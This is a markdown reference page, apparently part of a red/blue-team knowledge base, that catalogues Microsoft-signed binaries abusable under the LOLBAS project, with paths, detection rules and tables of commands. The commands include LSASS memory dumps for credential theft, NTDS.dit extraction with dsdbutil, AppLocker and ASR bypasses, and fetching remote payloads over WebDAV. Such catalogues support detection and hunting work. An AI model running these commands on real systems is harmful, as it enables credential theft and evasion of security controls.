---
title: lolbins_other_ms_binaries
category: reasoning
engine: team_strategy_arbiter
team_role: lolbins
os_platform: windows
domain_hub: "[[reasoning/LOLBINS]]"
primary_tactic: Defense_Evasion_Firewall
summary: "LOLBINS Other Microsoft-Signed Binaries (57 binaries from https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OtherMSBinaries): Complete reference for Microsoft SDK, .NET, Visual Studio, Office, Exchange, SQL, and Sysinternals signed binaries including AccCheckConsole.exe, Adplus.exe, AgentExecutor.exe, Appcert.exe, Appvlp.exe, Bginfo.exe, Cdb.exe, Coregen.exe, Createdump.exe, Csi.exe, DefaultPack.exe, Devinit.exe, Devtoolslauncher.exe, Dnx.exe, Dotnet.exe, Dsdbutil.exe (NTDS.dit dump), Dump64.exe, DumpMinitool.exe, Dxcap.exe, Excel.exe, Fsi.exe, FsiAnyCpu.exe, Mftrace.exe, Msdeploy.exe, Msxsl.exe, Ntdsutil.exe (Active Directory NTDS.dit extraction), OpenConsole.exe, Powerpnt.exe, Procdump.exe, ProtocolHandler.exe, Rcsi.exe, Remote.exe, Sqlps.exe, Sqltoolsps.exe, Squirrel.exe, Te.exe, Tracker.exe, Update.exe, VisualUiaVerifyNative.exe, Vsdiagnostics.exe, Vsiisexelauncher.exe, Vsjitdebugger.exe, Winword.exe, Wsl.exe."
when_to_apply: "Apply when executing, auditing, or hunting Microsoft-signed third-party/SDK/Office/AD binaries (OtherMSBinaries) such as ntdsutil.exe or dsdbutil.exe (Active Directory NTDS.dit credential dumping), procdump.exe, createdump.exe, dump64.exe, adplus.exe, cdb.exe, bginfo.exe, dotnet.exe, csi.exe, fsi.exe, msxsl.exe, te.exe, tracker.exe, or wsl.exe."
tags: [reasoning, lolbins, lolbas, othermsbinaries, windows, living-off-the-land, ntdsutil, dsdbutil, ntds, procdump, createdump, dump64, adplus, cdb, bginfo, dotnet, csi, fsi, msxsl, wsl, tracker, red-team, hunt-team, blue-team]
updated: 2026-11-01 01:10:00
---
# LOLBINS — Other Microsoft-Signed Binaries (`yml/OtherMSBinaries`, 57 Binaries)

> **Parent Section Hub:** [[reasoning/LOLBINS]]  
> **Official Repository:** [`https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OtherMSBinaries`](https://github.com/CROWInnovations/LOLBAS/tree/master/yml/OtherMSBinaries)  
> **Sibling Playbooks:** [[reasoning/LOLBINS/lolbins_os_binaries_a_to_l]] | [[reasoning/LOLBINS/lolbins_os_binaries_m_to_z]] | [[reasoning/LOLBINS/lolbins_os_scripts_and_libraries]] | [[reasoning/LOLBINS/lolbins_tactical_categories_and_detections]]  
> **Backlinks:** [[00_MEMORY_INDEX]] | [[commands/windows_master_command_playbook]] | [[reasoning/red_team_strategy_playbook]] | [[reasoning/hunt_team_strategy_playbook]] | [[reasoning/blue_team_strategy_playbook]]

---

## Complete Other Microsoft-Signed Binaries (`OtherMSBinaries`) Reference

### `AccCheckConsole.exe` (`yml/OtherMSBinaries/AccCheckConsole.yml`)
- **Description:** Verifies UI accessibility requirements
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/AccCheckConsole.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/AccCheckConsole.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/AccCheckConsole.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\x86\AccChecker\AccCheckConsole.exe`, `C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\x64\AccChecker\AccCheckConsole.exe`, `C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\arm\AccChecker\AccCheckConsole.exe`, `C:\Program Files (x86)\Windows Kits\10\bin\10.0.22000.0\arm64\AccChecker\AccCheckConsole.exe`
- **Key Forensic / Hunt IOCs:** `Sysmon Event ID 1 - Process Creation`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_susp_acccheckconsole.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `AccCheckConsole.exe -window "Untitled - Notepad" C:\path\to\your\lolbas.dll` | Local execution of managed code from assembly DLL. |
| **AWL Bypass** | `T1218` | `User` | `AccCheckConsole.exe -window "Untitled - Notepad" C:\path\to\your\lolbas.dll` | Local execution of managed code to bypass AppLocker. |

### `adplus.exe` (`yml/OtherMSBinaries/Adplus.yml`)
- **Description:** Debugging tool included with Windows Debugging Tools
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Adplus.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Adplus.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Adplus.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\adplus.exe`, `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\adplus.exe`
- **Key Forensic / Hunt IOCs:** `As a Windows SDK binary, execution on a system may be suspicious`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_adplus.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003.001` | `SYSTEM` | `adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet` | Create memory dump and parse it offline |
| **Execute** | `T1127` | `User` | `adplus.exe -c config-adplus.xml` | Run commands under a trusted Microsoft signed binary |
| **Dump** | `T1003.001` | `SYSTEM` | `adplus.exe -c config-adplus.xml` | Run commands under a trusted Microsoft signed binary |
| **Execute** | `T1127` | `User` | `adplus.exe -crash -o "C:\temp\" -sc calc.exe` | Run commands under a trusted Microsoft signed binary |

### `AgentExecutor.exe` (`yml/OtherMSBinaries/Agentexecutor.yml`)
- **Description:** Intune Management Extension included on Intune Managed Devices
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Agentexecutor.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Agentexecutor.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Agentexecutor.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Intune Management Extension`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_agentexecutor.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_agentexecutor_susp_usage.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `AgentExecutor.exe -powershell "c:\temp\malicious.ps1" "c:\temp\test.log" "c:\temp\test1.log" "c:\temp\test2.log" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1` | Execute unsigned powershell scripts |
| **Execute** | `T1218` | `User` | `AgentExecutor.exe -powershell "c:\temp\malicious.ps1" "c:\temp\test.log" "c:\temp\test1.log" "c:\temp\test2.log" 60000 "C:\temp\" 0 1` | Execute a provided EXE |

### `AppCert.exe` (`yml/OtherMSBinaries/Appcert.yml`)
- **Description:** Windows App Certification Kit command-line tool.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Appcert.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Appcert.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Appcert.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Windows Kits\10\App Certification Kit\appcert.exe`, `C:\Program Files\Windows Kits\10\App Certification Kit\appcert.exe`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `Administrator` | `appcert.exe test -apptype desktop -setuppath c:\windows\system32\notepad.exe -reportoutputpath c:\users\public\output.xml` | Performs execution of specified file, can be used as a defense evasion |
| **Execute** | `T1218.007` | `Administrator` | `appcert.exe test -apptype desktop -setuppath c:\users\public\malicious.msi -setupcommandline /q -reportoutputpath c:\users\public\output.xml` | Execute custom made MSI file with malicious code |

### `Appvlp.exe` (`yml/OtherMSBinaries/Appvlp.yml`)
- **Description:** Application Virtualization Utility Included with Microsoft Office 2016
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Appvlp.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Appvlp.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft Office\root\client\appvlp.exe`, `C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_appvlp.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `AppVLP.exe \\webdav\calc.bat` | Execution of BAT file hosted on Webdav server. |
| **Execute** | `T1218` | `User` | `AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"` | Local execution of process bypassing Attack Surface Reduction (ASR). |
| **Execute** | `T1218` | `User` | `AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"` | Local execution of process bypassing Attack Surface Reduction (ASR). |

### `Bginfo.exe` (`yml/OtherMSBinaries/Bginfo.yml`)
- **Description:** Background Information Utility included with SysInternals Suite
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Bginfo.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Bginfo.yml`
- **Default Windows Paths:** `No fixed path`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `bginfo.exe bginfo.bgi /popup /nolicprompt` | Local execution of VBScript |
| **AWL Bypass** | `T1218` | `User` | `bginfo.exe bginfo.bgi /popup /nolicprompt` | Local execution of VBScript |
| **Execute** | `T1218` | `User` | `\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt` | Remote execution of VBScript |
| **AWL Bypass** | `T1218` | `User` | `\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt` | Remote execution of VBScript |
| **Execute** | `T1218` | `User` | `\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt` | Remote execution of VBScript |
| **AWL Bypass** | `T1218` | `User` | `\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt` | Remote execution of VBScript |

### `Cdb.exe` (`yml/OtherMSBinaries/Cdb.yml`)
- **Description:** Debugging tool included with Windows Debugging Tools.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Cdb.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Cdb.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe`, `C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\cdb.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_cdb.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `cdb.exe -cf x64_calc.wds -o notepad.exe` | Local execution of assembly shellcode. |
| **Execute** | `T1127` | `User` | `cdb.exe -pd -pn <process_name> .shell <cmd>` | Run a shell command under a trusted Microsoft signed binary |
| **Execute** | `T1127` | `User` | `cdb.exe -c C:\debug-script.txt calc` | Run commands under a trusted Microsoft signed binary |

### `coregen.exe` (`yml/OtherMSBinaries/Coregen.yml`)
- **Description:** Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within "C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Coregen.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Coregen.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Coregen.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft Silverlight\5.1.50918.0\coregen.exe`, `C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\coregen.exe`
- **Key Forensic / Hunt IOCs:** `coregen.exe loading .dll file not in "C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\"`; `coregen.exe loading .dll file not named coreclr.dll`; `coregen.exe command line containing -L or -l`; `coregen.exe command line containing unexpected/invald assembly name`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/image_load/image_load_side_load_coregen.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1055` | `User` | `coregen.exe /L C:\folder\evil.dll dummy_assembly_name` | Execute DLL code |
| **Execute** | `T1055` | `User` | `coregen.exe dummy_assembly_name` | Execute DLL code |
| **AWL Bypass** | `T1218` | `User` | `coregen.exe /L C:\folder\evil.dll dummy_assembly_name` | Execute DLL code |

### `Createdump.exe` (`yml/OtherMSBinaries/Createdump.yml`)
- **Description:** Microsoft .NET Runtime Crash Dump Generator (included in .NET Core)
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Createdump.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Createdump.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Createdump.yml`
- **Default Windows Paths:** `C:\Program Files\dotnet\shared\Microsoft.NETCore.App\*\createdump.exe`, `C:\Program Files (x86)\dotnet\shared\Microsoft.NETCore.App\*\createdump.exe`, `C:\Program Files\Microsoft Visual Studio\*\Community\dotnet\runtime\shared\Microsoft.NETCore.App\6.0.0\createdump.exe`, `C:\Program Files (x86)\Microsoft Visual Studio\*\Community\dotnet\runtime\shared\Microsoft.NETCore.App\6.0.0\createdump.exe`
- **Key Forensic / Hunt IOCs:** `createdump.exe process with a command line containing the lsass.exe process id`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_proc_dump_createdump.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_renamed_createdump.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003` | `SYSTEM` | `createdump.exe -n -f dump.dmp [PID]` | Dump process memory contents using PID. |

### `csi.exe` (`yml/OtherMSBinaries/Csi.yml`)
- **Description:** Command line interface included with Visual Studio.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Csi.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Csi.yml`
- **Default Windows Paths:** `c:\Program Files (x86)\Microsoft Visual Studio\2017\Community\MSBuild\15.0\Bin\Roslyn\csi.exe`, `c:\Program Files (x86)\Microsoft Web Tools\Packages\Microsoft.Net.Compilers.X.Y.Z\tools\csi.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_csi_execution.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_csi_use_of_csharp_console.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `csi.exe file` | Local execution of unsigned C# code. |

### `DefaultPack.EXE` (`yml/OtherMSBinaries/DefaultPack.yml`)
- **Description:** This binary can be downloaded along side multiple software downloads on the microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/DefaultPack.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/DefaultPack.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/DefaultPack.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft\DefaultPack\`
- **Key Forensic / Hunt IOCs:** `DefaultPack.EXE spawned an unknown process`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_defaultpack.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `DefaultPack.EXE /C:"process.exe args"` | Can be used to execute stagers, binaries, and other malicious commands. |

### `Devinit.exe` (`yml/OtherMSBinaries/Devinit.yml`)
- **Description:** Visual Studio 2019 tool
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Devinit.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Devinit.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Devinit.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft Visual Studio\*\Community\Common7\Tools\devinit\devinit.exe`, `C:\Program Files (x86)\Microsoft Visual Studio\*\Community\Common7\Tools\devinit\devinit.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.007` | `User` | `devinit.exe run -t msi-install -i https://example.com/out.msi` | Executes code from a (remote) MSI file. |

### `Devtoolslauncher.exe` (`yml/OtherMSBinaries/Devtoolslauncher.yml`)
- **Description:** Binary will execute specified binary. Part of VS/VScode installation.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Devtoolslauncher.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Devtoolslauncher.yml`
- **Default Windows Paths:** `c:\windows\system32\devtoolslauncher.exe`
- **Key Forensic / Hunt IOCs:** `DeveloperToolsSvc.exe spawned an unknown process`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_devtoolslauncher.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] "argument here" test` | Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary. https://i.imgur.com/Go7rc0I.png |
| **Execute** | `T1127` | `User` | `devtoolslauncher.exe LaunchForDebug [PATH_TO_BIN] "argument here" test` | Execute any binary with given arguments. |

### `dnx.exe` (`yml/OtherMSBinaries/Dnx.yml`)
- **Description:** .Net Execution environment file included with .Net.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Dnx.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Dnx.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Dnx.yml`
- **Default Windows Paths:** `N/A`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dnx.yml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml), [Elastic](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1127` | `User` | `dnx.exe consoleapp` | Local execution of C# project stored in consoleapp folder. |

### `Dotnet.exe` (`yml/OtherMSBinaries/Dotnet.yml`)
- **Description:** dotnet.exe comes with .NET Framework
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Dotnet.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Dotnet.yml`
- **Default Windows Paths:** `C:\Program Files\dotnet\dotnet.exe`
- **Key Forensic / Hunt IOCs:** `dotnet.exe spawned an unknown process`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dotnet.yml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1218` | `User` | `dotnet.exe [PATH_TO_DLL]` | Execute code bypassing AWL |
| **Execute** | `T1218` | `User` | `dotnet.exe [PATH_TO_DLL]` | Execute DLL |
| **Execute** | `T1059` | `User` | `dotnet.exe fsi` | Execute arbitrary F# code |
| **AWL Bypass** | `T1218` | `User` | `dotnet.exe msbuild [Path_TO_XML_CSPROJ]` | Execute code bypassing AWL |

### `dsdbutil.exe` (`yml/OtherMSBinaries/Dsdbutil.yml`)
- **Description:** Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Dsdbutil.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Dsdbutil.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Dsdbutil.yml`
- **Default Windows Paths:** `C:\Windows\System32\dsdbutil.exe`, `C:\Windows\SysWOW64\dsdbutil.exe`
- **Key Forensic / Hunt IOCs:** `Event ID 4688`; `dsdbutil.exe process creation`; `Event ID 4663`; `Regular and Volume Shadow Copy attempts to read or modify ntds.dit`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"` | Snapshoting of Active Directory NTDS.dit database |
| **Dump** | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"` | Mounting the snapshot to access the ntds.dit with copy c:\[Snap Volume]\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak |
| **Dump** | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit" "quit"` | Deletes the snapshot |
| **Dump** | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"` | Mounting the snapshot identifier 1 and accessing it with with copy c:\[Snap Volume]\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak |
| **Dump** | `T1003.003` | `Administrator` | `dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"` | deletes the snapshot |

### `Dump64.exe` (`yml/OtherMSBinaries/Dump64.yml`)
- **Description:** Memory dump tool that comes with Microsoft Visual Studio
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/Dump64.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/Dump64.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/Dump64.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Visual Studio\Installer\Feedback\dump64.exe`
- **Key Forensic / Hunt IOCs:** `As a Windows SDK binary, execution on a system may be suspicious`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dump64.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003.001` | `Administrator` | `dump64.exe <pid> out.dmp` | Create memory dump and parse it offline to retrieve credentials. |

### `DumpMinitool.exe` (`yml/OtherMSBinaries/DumpMinitool.yml`)
- **Description:** Dump tool part Visual Studio 2022
- **CROW Innovations LOLBAS Source:** [`yml/OtherMSBinaries/DumpMinitool.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OtherMSBinaries/DumpMinitool.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OtherMSBinaries/DumpMinitool.yml`
- **Default Windows Paths:** `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_dumpminitool_execution.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_dumpminitool_susp_execution.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml)

